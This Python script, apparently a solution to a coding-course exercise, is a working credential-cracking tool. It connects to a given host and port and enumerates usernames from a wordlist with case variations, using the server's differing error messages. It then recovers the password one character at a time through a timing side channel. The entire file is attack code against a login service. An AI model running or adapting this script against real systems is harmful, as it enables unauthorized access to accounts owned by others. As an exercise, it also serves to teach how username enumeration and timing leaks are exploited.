import json
import socket
import argparse
import itertools
import os
import time

parser = argparse.ArgumentParser()
parser.add_argument('hostname', type=str)
parser.add_argument('port', type=int)

args = parser.parse_args()


def bruteforce_login():
    logins_path = os.path.join(os.path.dirname(__file__), "logins.txt")
    with open(logins_path, 'r') as logins:
        logins = [log.strip() for log in logins.readlines()]
        for login_variation in logins:
            login_variation = map(lambda x: ''.join(x),
                                  itertools.product(
                                      *([letter.lower(), letter.upper()] for letter in login_variation)))
            for login in login_variation:
                yield login


def bruteforce_password():
    low_alphabet = [chr(i) for i in range(ord('a'), ord('z') + 1)]
    nums = [str(n) for n in range(0, 10)]
    up_alphabet = [char.upper() for char in low_alphabet]
    symbols = low_alphabet + up_alphabet + nums

    i = 0
    while True:
        i += 1
        passwords = itertools.chain(symbols)
        for p in passwords:
            yield p


with socket.socket() as client_socket:
    address = (args.hostname, args.port)
    client_socket.connect(address)

    login_generator = bruteforce_login()
    password_generator = bruteforce_password()

    correct_login = ''
    correct_password = ''

    while True:
        suggested_login = ''.join(next(login_generator))
        message = {'login': suggested_login, 'password': ' '}
        json_file = json.dumps(message).encode()
        client_socket.send(json_file)
        json_response = client_socket.recv(1024)
        response = json.loads(json_response.decode())
        if response['result'] == "Wrong password!":
            correct_login = suggested_login
            break
        elif response['result'] == "Wrong login!":
            continue

    while True:
        suggested_password = correct_password + ''.join(next(password_generator))
        message = {'login': correct_login, 'password': suggested_password}
        json_file = json.dumps(message)
        client_socket.send(json_file.encode())
        start = time.perf_counter()
        json_response = client_socket.recv(1024)
        final = time.perf_counter()
        response = json.loads(json_response.decode())
        if (final - start) >= 0.1:
            correct_password += suggested_password[-1]
            continue
        elif response['result'] == 'Wrong password!':
            continue
        elif response['result'] == 'Connection success!':
            print(json_file)
            break
